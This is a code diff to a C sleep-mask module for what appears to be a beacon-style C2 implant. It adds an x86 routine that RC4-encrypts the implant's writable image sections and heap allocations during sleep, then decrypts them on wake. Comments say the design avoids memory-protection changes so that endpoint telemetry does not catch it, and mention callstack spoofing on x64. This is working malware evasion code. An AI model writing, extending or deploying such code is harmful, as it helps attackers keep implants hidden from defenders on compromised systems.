@@ -9,6 +9,56 @@
  * reason are the spoofed ones for the entire window. */
 #include "sleepmask_gen3.h"
 
+/* ================= shared gen3 primitives (both arches) ================= */
+
+typedef struct _G3_USTRING {
+	ULONG Length;
+	ULONG MaximumLength;
+	PUCHAR Buffer;
+} G3_USTRING;
+
+typedef LONG(NTAPI *G3_SF032)(G3_USTRING * data, G3_USTRING * key);
+
+typedef struct {
+	unsigned char * ptr;
+	unsigned long len;
+} G3_BLOCK;
+
+#define G3_MAX_BLOCKS 300
+
+static void g3_rc4(G3_SF032 fn, unsigned char * buf, unsigned long len, const unsigned char * key, unsigned int ctr)
+{
+	unsigned char k[16];
+	G3_USTRING d, kk;
+	int j;
+
+	for (j = 0; j < 16; j++)
+		k[j] = key[j];
+	k[0] ^= (unsigned char)ctr;
+	k[1] ^= (unsigned char)(ctr >> 8);
+	kk.Buffer = k;
+	kk.Length = kk.MaximumLength = 16;
+
+	d.Buffer = buf;
+	d.Length = d.MaximumLength = len;
+
+	fn(&d, &kk);
+	for (j = 0; j < 16; j++)
+		k[j] = 0;
+}
+
+static BOOL g3_page_writable(void * p)
+{
+	MEMORY_BASIC_INFORMATION mbi;
+
+	if (p == NULL)
+		return FALSE;
+	if (!VirtualQuery(p, &mbi, sizeof(mbi)))
+		return FALSE;
+	return (mbi.Protect & (PAGE_READWRITE | PAGE_WRITECOPY |
+	                       PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)) != 0;
+}
+
 #if defined(_M_X64)
 
 #include <windows.h>
@@ -19,32 +69,6 @@
 #include "gargleint.h"
 #include "track_memory.h"
 
-/* ---------------- RC4 via advapi32!SystemFunction032 ---------------- */
-
-typedef struct _G3_USTRING {
-	ULONG Length;
-	ULONG MaximumLength;
-	PUCHAR Buffer;
-} G3_USTRING;
-
-typedef LONG(NTAPI *G3_SF032)(G3_USTRING * data, G3_USTRING * key); /* advapi32 SystemFunction032 = RtlEncryptDecryptRC4, returns NTSTATUS (LONG) */
-
-/* ---- tracing probes (rounds 12-17), compiled out unless G3_TRACE ----
- *
- * Round 12 lesson baked into the design: any logging inside the masked
- * window must go through G3_IO - kernel32 pointers + path copied ONCE at
- * init, carried on the stack via G3_MASKCTX (the round-12 crash was
- * g3_log's CreateFileA through the ciphertext .rdata IAT). g3_log
- * (string form) is for outside-window lines only.
- *
- * Default build: G3_TRACE undefined -> g3_log is a header macro no-op and
- * g3_log_n/g3_chk are no-op macros below; the whole file-IO layer and the
- * mctx.io field disappear at preprocessing. */
-
-#if defined(G3_TRACE)
-
-typedef struct {
-	HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, void *, DWORD, DWORD, HANDLE);
 	BOOL   (WINAPI *pWriteFile)(HANDLE, const void *, DWORD, DWORD *, void *);
 	BOOL   (WINAPI *pCloseHandle)(HANDLE);
 	char   path[64];
@@ -158,63 +182,21 @@ static unsigned long long g3_chk(const unsigned char * p, unsigned long len)
 
 #endif /* G3_TRACE */
 
+typedef struct {
+	G3_BLOCK * blocks;
+	int nblocks;
+	unsigned char key[16];
+	G3_SF032 fn;
+#if defined(G3_TRACE)
+	G3_IO io;
+#endif
+} G3_MASKCTX;
+
 static G3_SF032 g_sf032;
-
-/* RC4 is a stream cipher: running it twice with the same key restores the
- * plaintext, so one routine serves as both encrypt and decrypt. Each block
- * derives its own key (16B key XOR'd with the block counter) so two blocks
- * never share a keystream. No CRT calls in here on purpose: the loop body
- * runs while .rdata (IAT) is ciphertext (the 16B copies inline today, but
- * explicit loops keep that true under any optimizer). */
-static void g3_rc4(G3_SF032 fn, unsigned char * buf, unsigned long len, const unsigned char * key, unsigned int ctr)
-{
-	unsigned char k[16];
-	G3_USTRING d, kk;
-	int j;
-
-	for (j = 0; j < 16; j++)
-		k[j] = key[j];
-	k[0] ^= (unsigned char)ctr;
-	k[1] ^= (unsigned char)(ctr >> 8);
-	kk.Buffer = k;
-	kk.Length = kk.MaximumLength = 16;
-
-	d.Buffer = buf;
-	d.Length = d.MaximumLength = len;
-
-	fn(&d, &kk);
-	for (j = 0; j < 16; j++)
-		k[j] = 0;
-}
 
 /* Snapshot of the block list, taken before any region is touched: masking
  * .data corrupts gparms (which points into .data) and the heap_records
  * array (in .bss) mid-walk, so the walk itself must run off local copies. */
-#define G3_MAX_BLOCKS 300
-
-typedef struct {
-	unsigned char * ptr;
-	unsigned long len;
-} G3_BLOCK;
-
-/* A block can only be RC4'd in place if it is writable. The header page
- * of a LoadLibrary'd module (extc2 payload inside the python controller)
- * is mapped read-only after load - masking it was an instant access
- * violation writing the image base (round 18). Skip non-writable pages
- * instead of flipping protections: a flip is the Gen1 permission-flip
- * telemetry this whole design exists to avoid. */
-static BOOL g3_page_writable(void * p)
-{
-	MEMORY_BASIC_INFORMATION mbi;
-
-	if (p == NULL)
-		return FALSE;
-	if (!VirtualQuery(p, &mbi, sizeof(mbi)))
-		return FALSE;
-	return (mbi.Protect & (PAGE_READWRITE | PAGE_WRITECOPY |
-	                       PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)) != 0;
-}
-
 static int g3_snapshot_blocks(G3_BLOCK * out, int max)
 {
 	GARGLEP parms = *gparms;
@@ -726,16 +708,6 @@ done:
 
 /* ---------------- entry ---------------- */
 
-typedef struct {
-	G3_BLOCK * blocks;
-	int nblocks;
-	unsigned char key[16];
-	G3_SF032 fn; /* cached pre-mask: .data (holding g_sf032) is ciphertext until unmask completes */
-#if defined(G3_TRACE)
-	G3_IO io;    /* cached pre-mask: trace file ops must not go through the IAT */
-#endif
-} G3_MASKCTX;
-
 static void g3_mask_all_cb(void * vctx)
 {
 	G3_MASKCTX * m = (G3_MASKCTX *)vctx;
@@ -923,7 +895,9 @@ BOOL gen3_wait_pipe(HANDLE pipe)
 	return FALSE;   /* caller takes the plan-B loop for error handling */
 }
 
-#else /* !_M_X64 */
+#else /* !_M_X64: x86 Gen3 1a — RC4 masking, no ROP (callstack spoof stays
+       * x64-only; x86's unwinding/telemetry surface differs and the official
+       * BOF is unusable here anyway - it crashes at blob+0x3b in WOW64). */
 
 BOOL gen3_wait_pipe(HANDLE pipe)
 {
@@ -931,12 +905,154 @@ BOOL gen3_wait_pipe(HANDLE pipe)
 	return FALSE;
 }
 
-/* gen3 is x64-only; unguarded callers (pivot/TCP wait slices) get the
- * plain-sleep fallback via the existing GargleSleep nook==0 behavior. */
+/* x86 slice of the gen3 family: same block snapshot + rotated-key RC4 as
+ * the x64 1a path (own-table sections + tracked heap, in-image and
+ * non-writable records skipped, .text excluded), served over a plain
+ * pointer-resolved Sleep. This replaces the crashing official sleepmask
+ * BOF (blob+0x3b in WOW64) with our own masking - the x86 own-table
+ * battle folded into the gen3 family instead of fighting the official
+ * blob's layout assumptions. */
+static G3_SF032 g3_sf032_x86;
+
+static int g3_snap_x86(G3_BLOCK * out, int max)
+{
+	GARGLEP parms = *gparms;
+	HEAP_RECORD * hr = track_memory_get_heap_records_to_mask();
+	DWORD * sec;
+	int n = 0;
+	DWORD text_va = 0, text_end = 0;
+	DWORD sizeimg = 0;
+
+	{
+		unsigned char * pe = (unsigned char *)parms.beacon_ptr;
+		DWORD lfanew = *(DWORD *)(pe + 0x3C);
+		WORD nsec = *(WORD *)(pe + lfanew + 6);
+		WORD optsz = *(WORD *)(pe + lfanew + 20);
+		DWORD secoff = lfanew + 24 + optsz;
+		WORD i;
+		sizeimg = *(DWORD *)(pe + lfanew + 24 + 0x38);
+		for (i = 0; i < nsec; i++) {
+			unsigned char * so = pe + secoff + (DWORD)i * 40;
+			if (memcmp(so, ".text", 5) == 0) {
+				DWORD vsz = *(DWORD *)(so + 8);
+				text_va = *(DWORD *)(so + 12);
+				text_end = text_va + (vsz ? vsz : *(DWORD *)(so + 16));
+				break;
+			}
+		}
+	}
+
+	sec = (DWORD *)parms.sections;
+	if (sec != NULL) {
+		while (n + 1 < max) {
+			DWORD a = sec[0], b = sec[1];
+			if (a == 0 && b == 0)
+				break;
+			if (b > a) {
+				BOOL overlaps_text = (a < text_end && b > text_va);
+				if (!overlaps_text) {
+					if (g3_page_writable((unsigned char *)parms.beacon_ptr + a)) {
+						out[n].ptr = (unsigned char *)parms.beacon_ptr + a;
+						out[n].len = b - a;
+						n++;
+					}
+				}
+				else if (a < text_va) {
+					if (g3_page_writable((unsigned char *)parms.beacon_ptr + a)) {
+						out[n].ptr = (unsigned char *)parms.beacon_ptr + a;
+						out[n].len = text_va - a;
+						n++;
+					}
+				}
+			}
+			sec += 2;
+		}
+	}
+
+	{
+		unsigned char * img_lo = (unsigned char *)parms.beacon_ptr;
+		unsigned char * img_hi = img_lo + sizeimg;
+
+		while (n < max && hr != NULL && hr->ptr != NULL) {
+			unsigned char * hp = (unsigned char *)hr->ptr;
+			unsigned char * he = hp + hr->size;
+
+			if (hr->size > 0 && hr->size < 0x40000000) {
+				if (hp >= img_lo && he <= img_hi) {
+					/* in-image: already covered by the section block */
+				}
+				else {
+					if (hp < img_lo && he > img_lo)
+						he = img_lo;
+					if (hp < img_hi && he > img_hi)
+						hp = img_hi;
+					if (hp < he && g3_page_writable(hp)) {
+						out[n].ptr = hp;
+						out[n].len = (unsigned long)(he - hp);
+						n++;
+					}
+				}
+			}
+			hr++;
+		}
+	}
+
+	return n;
+}
+
 BOOL gen3_sleep(DWORD time)
 {
-	(void)time;
-	return FALSE;
+	unsigned char key[16];
+	G3_BLOCK blocks[G3_MAX_BLOCKS];
+	G3_MASKCTX mctx;
+	int nblocks;
+	int i;
+	void (WINAPI *psleep)(DWORD);
+
+	if (g3_sf032_x86 == NULL) {
+		g3_sf032_x86 = (G3_SF032)GetProcAddress(GetModuleHandleA("advapi32.dll"), "SystemFunction032");
+		if (g3_sf032_x86 == NULL)
+			return FALSE;
+	}
+	if (gparms == NULL)
+		gargle_setup_parms(NULL, NULL, 0);
+
+	psleep = (void (WINAPI *)(DWORD))GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep");
+	if (psleep == NULL)
+		return FALSE;
+
+	{
+		unsigned int * k = (unsigned int *)key;
+		for (i = 0; i < 4; i++)
+			k[i] = bigger_rand();
+	}
+
+	nblocks = g3_snap_x86(blocks, G3_MAX_BLOCKS);
+	if (nblocks == 0) {
+		psleep(time);
+		return TRUE; /* nothing to mask: served the window unmasked */
+	}
+
+	mctx.blocks = blocks;
+	mctx.nblocks = nblocks;
+	for (i = 0; i < 16; i++)
+		mctx.key[i] = key[i];
+	mctx.fn = g3_sf032_x86;
+
+	/* mask -> sleep -> unmask. The window contract holds: no API inside
+	 * the span (psleep pre-resolved), key/fn/blocks all stack or callee
+	 * memory, .text excluded so the return path stays executable. */
+	for (i = 0; i < nblocks; i++)
+		g3_rc4(mctx.fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
+	psleep(time);
+	for (i = 0; i < nblocks; i++)
+		g3_rc4(mctx.fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
+
+	for (i = 0; i < 16; i++)
+		key[i] = 0;
+	for (i = 0; i < (int)sizeof(mctx); i++)
+		((unsigned char *)&mctx)[i] = 0;
+	return TRUE;
 }
 
 #endif /* _M_X64 */
